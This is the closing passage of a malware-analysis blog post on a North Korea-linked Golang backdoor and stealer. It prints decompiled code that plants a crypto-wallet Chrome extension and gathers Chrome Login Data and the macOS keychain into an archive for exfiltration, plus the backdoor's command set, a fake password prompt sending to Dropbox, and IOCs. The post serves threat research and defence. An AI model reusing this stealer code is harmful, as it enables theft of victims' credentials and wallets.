		<span class="n">prefp</span><span class="o">.</span><span class="n">SetP</span><span class="p">(</span><span class="n">getExtHash</span><span class="p">(),</span> <span class="n">extension_hash_key</span><span class="p">)</span>

		<span class="n">os</span><span class="o">.</span><span class="n">WriteFile</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">prefp</span><span class="o">.</span><span class="n">Bytes</span><span class="p">(),</span> <span class="m">0</span><span class="n">o644</span><span class="p">)</span>
	<span class="p">}</span>

	<span class="k">return</span> <span class="n">config</span><span class="o">.</span><span class="n">MSG_LOG</span><span class="p">,</span> <span class="p">[][]</span><span class="kt">byte</span><span class="p">{[]</span><span class="kt">byte</span><span class="p">(</span><span class="n">config</span><span class="o">.</span><span class="n">LOG_SUCCESS</span><span class="p">),</span> <span class="p">[]</span><span class="kt">byte</span><span class="p">(</span><span class="s">"chrome preference change"</span><span class="p">)}</span>
<span class="p">}</span>

<span class="c">// get hash value</span>
<span class="k">func</span> <span class="n">getExtHash</span><span class="p">()</span> <span class="kt">string</span> <span class="p">{</span>

	<span class="k">if</span> <span class="n">runtime</span><span class="o">.</span><span class="n">GOOS</span> <span class="o">==</span> <span class="s">"windows"</span> <span class="p">{</span>
		<span class="k">return</span> <span class="s">"B4B0E19A98DEECCC9F9F7DC5F18999C1F2EAAE668F7968C96F7B1CB89C9B0FBD"</span>
	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
		<span class="k">return</span> <span class="s">"7A2DEA687C9AB3A86A82893014C926BBB82ECD27B446197559F7512DE9025DA5"</span>
	<span class="p">}</span>

<span class="p">}</span>

<span class="c">// get json string</span>
<span class="k">func</span> <span class="n">getExtJsonString</span><span class="p">()</span> <span class="kt">string</span> <span class="p">{</span>
	<span class="k">return</span> <span class="s">`{"active_permissions":{"api":["activeTab","clipboardWrite","notifications","storage","unlimitedStorage","webRequest"],"explicit_host":["*://*.eth/*","http://localhost:8545/*","https://*.codefi.network/*","https://*.cx.metamask.io/*","https://*.infura.io/*","https://chainid.network/*","https://lattice.gridplus.io/*"],"manifest_permissions":[],"scriptable_host":["*://connect.trezor.io/*/popup.html","file:///*","http://*/*","https://*/*"]},"commands":{"_execute_browser_action":{"suggested_key":"Alt+Shift+M","was_assigned":true}},"content_settings":[],"creation_flags":38,"events":[],"first_install_time":"13361518520188298","from_webstore":false,"granted_permissions":{"api":["activeTab","clipboardWrite","notifications","storage","unlimitedStorage","webRequest"],"explicit_host":["*://*.eth/*","http://localhost:8545/*","https://*.codefi.network/*","https://*.cx.metamask.io/*","https://*.infura.io/*","https://chainid.network/*","https://lattice.gridplus.io/*"],"manifest_permissions":[],"scriptable_host":["*://connect.trezor.io/*/popup.html","file:///*","http://*/*","https://*/*"]},"incognito_content_settings":[],"incognito_preferences":{},"last_update_time":"13361518520188298","location":4,"newAllowFileAccess":true,"path":"C:\\ProgramData\\11.16.0_0","preferences":{},"regular_only_preferences":{},"state":1,"was_installed_by_default":false,"was_installed_by_oem":false,"withholding_permissions":false}`</span>
<span class="p">}</span>
</pre></table></code></div></div><ul><li>AUTO_CHROME_COOKIE (“gi%#”)</ul><p>There are 3 functions defined for this command, dependent on the target operating system (chrome_cookie_darwin, chrome_cookie_win, and chrome_cookie_other). The macOS version of the command does not seem to implement the stealing of sensitive data, and it has various unused functions. The Windows version, however, does implement code for stealing sensitive browser data, such as login data. The stealer code seems to be based on projects such as <a href="https://github.com/SaturnsVoid/Chrome-Password-Recovery/tree/master">https://github.com/SaturnsVoid/Chrome-Password-Recovery/tree/master</a> and <a href="https://github.com/moonD4rk/HackBrowserData">https://github.com/moonD4rk/HackBrowserData</a>.</p><ul><li>AUTO_CHROME_KEYCHAIN (“kyci”)</ul><p>This is the command used for mac targets (and not for other operating systems). It compresses and exfiltrates sensitive from the keychain and Chrome Login Data in <code class="language-plaintext highlighter-rouge">gatherchain.tar.gz</code>.</p><div class="language-golang highlighter-rouge"><div class="code-header"> <span data-label-text="Golang"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
</pre><td class="rouge-code"><pre><span class="k">func</span> <span class="n">AutoModeMacChromeLoginData</span><span class="p">()</span> <span class="p">(</span><span class="kt">string</span><span class="p">,</span> <span class="p">[][]</span><span class="kt">byte</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">var</span> <span class="p">(</span>
		<span class="n">buf</span>          <span class="n">bytes</span><span class="o">.</span><span class="n">Buffer</span>
		<span class="n">userdata_dir</span> <span class="kt">string</span>
		<span class="n">keychain_dir</span> <span class="kt">string</span>
		<span class="n">path_list</span>    <span class="p">[]</span><span class="kt">string</span>
	<span class="p">)</span>


	<span class="c">// gather</span>
	<span class="n">userdata_dir</span> <span class="o">=</span> <span class="n">getUserdataDir</span><span class="p">()</span>
	<span class="n">keychain_dir</span> <span class="o">=</span> <span class="n">getKeychainFileMacDir</span><span class="p">()</span>
	<span class="c">// file system search</span>
	<span class="n">_</span> <span class="o">=</span> <span class="n">filepath</span><span class="o">.</span><span class="n">Walk</span><span class="p">(</span><span class="n">userdata_dir</span><span class="p">,</span> <span class="k">func</span><span class="p">(</span><span class="n">path</span> <span class="kt">string</span><span class="p">,</span> <span class="n">info</span> <span class="n">os</span><span class="o">.</span><span class="n">FileInfo</span><span class="p">,</span> <span class="n">err</span> <span class="kt">error</span><span class="p">)</span> <span class="kt">error</span> <span class="p">{</span>
		<span class="k">if</span> <span class="n">info</span><span class="o">.</span><span class="n">Name</span><span class="p">()</span> <span class="o">==</span> <span class="n">logins_data_file</span> <span class="p">{</span>
			<span class="n">path_list</span> <span class="o">=</span> <span class="nb">append</span><span class="p">(</span><span class="n">path_list</span><span class="p">,</span> <span class="n">path</span><span class="p">)</span>
		<span class="p">}</span>
		<span class="k">return</span> <span class="no">nil</span>
	<span class="p">})</span>
	<span class="n">path_list</span> <span class="o">=</span> <span class="nb">append</span><span class="p">(</span><span class="n">path_list</span><span class="p">,</span> <span class="n">keychain_dir</span><span class="p">);</span>

	<span class="n">_</span> <span class="o">=</span> <span class="n">util</span><span class="o">.</span><span class="n">Compress</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="n">path_list</span><span class="p">,</span> <span class="no">true</span><span class="p">)</span>

	<span class="c">// return</span>
	<span class="n">data</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">([][]</span><span class="kt">byte</span><span class="p">,</span> <span class="m">3</span><span class="p">)</span>
	<span class="n">data</span><span class="p">[</span><span class="m">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">[]</span><span class="kt">byte</span><span class="p">(</span><span class="n">config</span><span class="o">.</span><span class="n">LOG_SUCCESS</span><span class="p">)</span>
	<span class="n">data</span><span class="p">[</span><span class="m">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">[]</span><span class="kt">byte</span><span class="p">(</span><span class="s">"gatherchain.tar.gz"</span><span class="p">)</span>
	<span class="n">data</span><span class="p">[</span><span class="m">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">buf</span><span class="o">.</span><span class="n">Bytes</span><span class="p">()</span>
	<span class="n">msg_type</span> <span class="o">:=</span> <span class="n">config</span><span class="o">.</span><span class="n">MSG_FILE</span>

	<span class="k">return</span> <span class="n">msg_type</span><span class="p">,</span> <span class="n">data</span>
<span class="p">}</span>

<span class="c">//uses:</span>
<span class="k">func</span> <span class="n">getKeychainFileMacDir</span><span class="p">()</span> <span class="kt">string</span> <span class="p">{</span>
	<span class="k">var</span> <span class="n">home</span> <span class="kt">string</span>
	<span class="k">var</span> <span class="n">begine_path</span> <span class="kt">string</span>

	<span class="n">home</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">Getenv</span><span class="p">(</span><span class="s">"HOME"</span><span class="p">)</span>
	<span class="n">begine_path</span> <span class="o">=</span> <span class="n">filepath</span><span class="o">.</span><span class="n">Join</span><span class="p">(</span><span class="n">home</span><span class="p">,</span> <span class="n">keychain_dir_darwin</span><span class="p">);</span>

	<span class="k">return</span> <span class="n">begine_path</span>
<span class="p">}</span>

<span class="c">//where keychain_dir_darwin is "Library/Keychains/login.keychain-db"</span>
</pre></table></code></div></div><h1 id="chromeupdatealert">ChromeUpdateAlert</h1><p>During the initial execution of the infection chain, ChromeUpdateAlert.app, a Mach-O application, is also executed. I don’t have an environment to test this app, but the decompiled code suggests that it displays a fake microphone alert which requests user authentication. The alert leads to an input field for the victim to provide the password, which seems to be exfiltrated to Dropbox using the Dropbox API.</p><p>This Mach-O application has no detection in VT:</p><p><a href="/assets/images/dprk_chrome/macholowdetect.png" class="popup img-link shimmer"><img src="/assets/images/dprk_chrome/macholowdetect.png" alt="sshot" loading="lazy"></a></p><p>Fake authentication: <a href="/assets/images/dprk_chrome/fakeauth.png" class="popup img-link shimmer"><img src="/assets/images/dprk_chrome/fakeauth.png" alt="sshot" loading="lazy"></a></p><p>Password retrieval:</p><p><a href="/assets/images/dprk_chrome/getpassword.png" class="popup img-link shimmer"><img src="/assets/images/dprk_chrome/getpassword.png" alt="sshot" loading="lazy"></a></p><p>The password seems to be exfiltrated as “password.txt” using the Dropbox API</p><p><a href="/assets/images/dprk_chrome/passwdtxt.png" class="popup img-link shimmer"><img src="/assets/images/dprk_chrome/passwdtxt.png" alt="sshot" loading="lazy"></a></p><p><a href="/assets/images/dprk_chrome/DropboxAPI.png" class="popup img-link shimmer"><img src="/assets/images/dprk_chrome/DropboxAPI.png" alt="sshot" loading="lazy"></a></p><h1 id="appendix---configuration-file-of-the-golang-backdoorstealer">Appendix - Configuration file of the Golang Backdoor/Stealer</h1><div class="language-golang highlighter-rouge"><div class="code-header"> <span data-label-text="Golang"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre><td class="rouge-code"><pre><span class="k">package</span> <span class="n">config</span>

<span class="k">import</span> <span class="s">"time"</span>

<span class="k">const</span> <span class="p">(</span>
	<span class="n">MSG_INFO</span>    <span class="o">=</span> <span class="s">"fwe9"</span> <span class="c">// user,host,os,arch</span>
	<span class="n">MSG_LOG</span>     <span class="o">=</span> <span class="s">"1q2w"</span> <span class="c">// status,logmsg</span>
	<span class="n">LOG_SUCCESS</span> <span class="o">=</span> <span class="s">"true"</span>
	<span class="n">LOG_FAIL</span>    <span class="o">=</span> <span class="s">"false"</span>
	<span class="n">MSG_PING</span>    <span class="o">=</span> <span class="s">"poiu"</span>  <span class="c">// random128byte</span>
	<span class="n">MSG_FILE</span>    <span class="o">=</span> <span class="s">"qpwoe"</span> <span class="c">// name, filedata</span>

	<span class="n">COMMAND_INFO</span>          <span class="o">=</span> <span class="s">"qwer"</span> <span class="c">// REQ: type | RES: info</span>
	<span class="n">COMMAND_UPLOAD</span>        <span class="o">=</span> <span class="s">"asdf"</span> <span class="c">// REQ: type, path, filedata | RES: log</span>
	<span class="n">COMMAND_DOWNLOAD</span>      <span class="o">=</span> <span class="s">"zxcv"</span> <span class="c">// REQ: type, path | RES: file</span>
	<span class="n">COMMAND_OSSHELL</span>       <span class="o">=</span> <span class="s">"vbcx"</span> <span class="c">// REQ: type, shell, timeout | RES: log</span>
	<span class="n">SHELL_MODE_WAITGETOUT</span> <span class="o">=</span> <span class="s">"qmwn"</span>
	<span class="n">SHELL_MODE_DETACH</span>     <span class="o">=</span> <span class="s">"qalp"</span>
	<span class="n">COMMAND_WAIT</span>          <span class="o">=</span> <span class="s">"ghdj"</span> <span class="c">// REQ: type, interval | RES: ping</span>
	<span class="n">COMMAND_AUTO</span>          <span class="o">=</span> <span class="s">"r4ys"</span> <span class="c">// REQ: type, mode | RES: log</span>
	<span class="n">AUTO_CHROME_GATHER</span>    <span class="o">=</span> <span class="s">"89io"</span>
	<span class="n">AUTO_CHROME_PREFRST</span>   <span class="o">=</span> <span class="s">"7ujm"</span>
	<span class="n">AUTO_CHROME_COOKIE</span>    <span class="o">=</span> <span class="s">"gi%#"</span>
	<span class="n">AUTO_CHROME_KEYCHAIN</span>  <span class="o">=</span> <span class="s">"kyci"</span>
	<span class="n">COMMAND_EXIT</span>          <span class="o">=</span> <span class="s">"dghh"</span> <span class="c">// REQ: type | RES: x</span>

	<span class="n">DURATION_ERROR_WAIT</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">Minute</span> <span class="o">*</span> <span class="m">5</span>

	<span class="n">PID_FILE_NAME</span>       <span class="o">=</span> <span class="s">".store"</span>
	<span class="n">MACHINEID_FILE_NAME</span> <span class="o">=</span> <span class="s">".host"</span>

	<span class="n">DAEMON_VERSION</span> <span class="o">=</span> <span class="s">"2.0"</span>
<span class="p">)</span>
</pre></table></code></div></div><h1 id="iocs">IOCs</h1><ul><li>Golang backdoor/stealer: 60ec2dbe8cfacdff1d4eb093032b0307e52cc68feb1f67487d9f401017c3edd7<li>C2: http://216.74.123[.]191:8080<li>ChromeUpdateAlert.app: b72653bf747b962c67a5999afbc1d9156e1758e4ad959412ed7385abaedb21b6</ul></div><div class="post-tail-wrapper text-muted"><div class="post-tags"> <i class="fa fa-tags fa-fw me-1"></i> <a href="/tags/malware/" class="post-tag no-text-decoration" >malware</a> <a href="/tags/chrome/" class="post-tag no-text-decoration" >chrome</a> <a href="/tags/golang/" class="post-tag no-text-decoration" >golang</a></div><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 " ><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=North%20Korea-nexus%20Golang%20Backdoor/Stealer%20from%20Contagious%20Interview%20campaign%20-%20dmpdump&url=https%3A%2F%2Fdmpdump.github.io%2Fposts%2FNorthKorea_Backdoor_Stealer%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter"> <i class="fa-fw fa-brands fa-square-x-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=North%20Korea-nexus%20Golang%20Backdoor/Stealer%20from%20Contagious%20Interview%20campaign%20-%20dmpdump&u=https%3A%2F%2Fdmpdump.github.io%2Fposts%2FNorthKorea_Backdoor_Stealer%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fdmpdump.github.io%2Fposts%2FNorthKorea_Backdoor_Stealer%2F&text=North%20Korea-nexus%20Golang%20Backdoor/Stealer%20from%20Contagious%20Interview%20campaign%20-%20dmpdump" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!" > <i class="fa-fw fas fa-link pe-none fs-6"></i> </button> </span></div></div></div></article></main><aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted"><div class="access"><section id="access-lastmod"><h2 class="panel-heading">Recently Updated</h2><ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2"><li class="text-truncate lh-lg"> <a href="/posts/Havoc/">Targeted Campaign Delivering Havoc</a><li class="text-truncate lh-lg"> <a href="/posts/NorthKorea_Backdoor_Stealer/">North Korea-nexus Golang Backdoor/Stealer from Contagious Interview campaign</a><li class="text-truncate lh-lg"> <a href="/posts/TrojanizedChromeExtensions/">Trojanized Chrome Extensions</a><li class="text-truncate lh-lg"> <a href="/posts/KoiLoader/">KoiLoader/KoiStealer</a><li class="text-truncate lh-lg"> <a href="/posts/PUBLOAD_GrimResource/">PUBLOAD Likely Delivered to Thailand via GrimResource MSC</a></ul></section><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/malware/">malware</a> <a class="post-tag btn btn-outline-primary" href="/tags/chrome/">chrome</a> <a class="post-tag btn btn-outline-primary" href="/tags/re/">RE</a> <a class="post-tag btn btn-outline-primary" href="/tags/cti/">CTI</a> <a class="post-tag btn btn-outline-primary" href="/tags/golang/">golang</a> <a class="post-tag btn btn-outline-primary" href="/tags/havoc/">havoc</a></div></section></div></aside></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"><aside id="related-posts" aria-labelledby="related-label"><h3 class="mb-4" id="related-label">Further Reading</h3><nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4"><article class="col"> <a href="/posts/TrojanizedChromeExtensions/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1735430400" data-df="ll" > Dec 29, 2024 </time><h4 class="pt-0 my-2">Trojanized Chrome Extensions</h4><div class="text-muted"><p>I rarely deal with malicious browser extensions, however, they are likely to become increasingly relevant in the future. It is commonly said that “the browser is the new OS”, so it only makes sense...</p></div></div></a></article><article class="col"> <a href="/posts/Havoc/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1736985600" data-df="ll" > Jan 16, 2025 </time><h4 class="pt-0 my-2">Targeted Campaign Delivering Havoc</h4><div class="text-muted"><p>On January 15, 2025, a file named DH-Report76.pdf.lnk was uploaded to VirusTotal. The LNK file was likely being delivered to victims from army-mil[.]zapto.org. Parsing the LNK file, we can see t...</p></div></div></a></article><article class="col"> <a href="/posts/PUBLOAD_GrimResource/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1735257600" data-df="ll" > Dec 27, 2024 </time><h4 class="pt-0 my-2">PUBLOAD Likely Delivered to Thailand via GrimResource MSC</h4><div class="text-muted"><p>On December 20, 2024, a Microsoft Management Console (MSC) file named “Invitation Letter.msc” was uploaded from Thailand to VirusTotal. File name: Invitation Letter.msc Hash: 5b18f8b379cb3294...</p></div></div></a></article></nav></aside><nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation"> <a href="/posts/TrojanizedChromeExtensions/" class="btn btn-outline-primary" aria-label="Older" ><p>Trojanized Chrome Extensions</p></a> <a href="/posts/Havoc/" class="btn btn-outline-primary" aria-label="Newer" ><p>Targeted Campaign Delivering Havoc</p></a></nav><footer aria-label="Site Info" class=" d-flex flex-column justify-content-center text-muted flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3 " ><p>© <time>2025</time> <a href="https://github.com/dmpdump">dmpdump</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p><p>Using the <a data-bs-toggle="tooltip" data-bs-placement="top" title="v7.1.0" href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener" >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.</p></footer></div></div><div id="search-result-wrapper" class="d-flex justify-content-center d-none"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/malware/">malware</a> <a class="post-tag btn btn-outline-primary" href="/tags/chrome/">chrome</a> <a class="post-tag btn btn-outline-primary" href="/tags/re/">RE</a> <a class="post-tag btn btn-outline-primary" href="/tags/cti/">CTI</a> <a class="post-tag btn btn-outline-primary" href="/tags/golang/">golang</a> <a class="post-tag btn btn-outline-primary" href="/tags/havoc/">havoc</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><aside aria-label="Scroll to Top"> <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow"> <i class="fas fa-angle-up"></i> </button></aside></div><div id="mask"></div><aside id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-animation="true" data-bs-autohide="false" ><div class="toast-header"> <button type="button" class="btn-close ms-auto" data-bs-dismiss="toast" aria-label="Close" ></button></div><div class="toast-body text-center pt-0"><p class="px-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></aside><script src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.13/dayjs.min.js,npm/dayjs@1.11.13/locale/en.js,npm/dayjs@1.11.13/plugin/relativeTime.js,npm/dayjs@1.11.13/plugin/localizedFormat.js"></script> <script src="/assets/js/dist/post.min.js"></script> <script defer src="/app.min.js"></script> <script>SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<article class="px-1 px-sm-2 px-lg-4 px-xl-0"><header><h2><a href="{url}">{title}</a></h2><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div></header><p>{snippet}</p></article>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
